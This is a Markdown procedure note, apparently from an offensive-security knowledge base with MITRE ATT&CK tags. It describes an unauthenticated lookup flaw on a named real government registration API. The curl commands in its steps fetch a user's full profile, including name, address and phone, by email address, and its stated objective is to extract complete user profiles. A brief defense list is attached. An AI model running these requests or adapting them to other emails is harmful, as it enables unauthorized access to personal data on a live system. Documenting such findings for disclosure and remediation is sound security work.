---
id: uuid-email-lookup-1
tags:
  - email-lookup
  - idor
  - pii
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-fetch-user-by-email]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:29:19.853Z'
skill_level: beginner
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Access User Data via Email Lookup

## Summary

This procedure accesses user registration data using email as the identifier in the API, exposing details including for pending users without authentication.

## Description

Targets https://tmss.gsa.gov/tmssserver/api/public/customerregistration/{email}/emailId/ to fetch full JSON. Useful for targeted lookups; reveals registrationStatus and all PII.

## Requirements

1. Known or guessed email
2. curl or browser
3. Unauthenticated access

## Defense

Defensive measures and detection strategies:

- Validate email ownership in API
- Sanitize URL parameters
- Detect email enumeration attempts

## Objectives

1. Fetch data by email
2. Confirm exposure of unapproved registrations
3. Extract complete user profile

## Instructions

### Step 1: Curl with Email

**Context**: Query endpoint using email path.

**Command** ([[commands/curl-fetch-user-by-email]]):

```bash
curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/"
```

> JSON includes userRegisterId, firstName, address, phone, etc.

### Step 2: Verify Response

**Context**: Check for sensitive fields.

Save output:

```bash
curl "https://tmss.gsa.gov/tmssserver/api/public/customerregistration/alexandrio+1@wearehackerone.com/emailId/" -o user_email.json
```

> Inspect for registrationStatus and PII.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-fetch-user-by-email]]

## Tools Used

- [[tools/curl]]

## Tags

- [[email-lookup]]
- [[idor]]
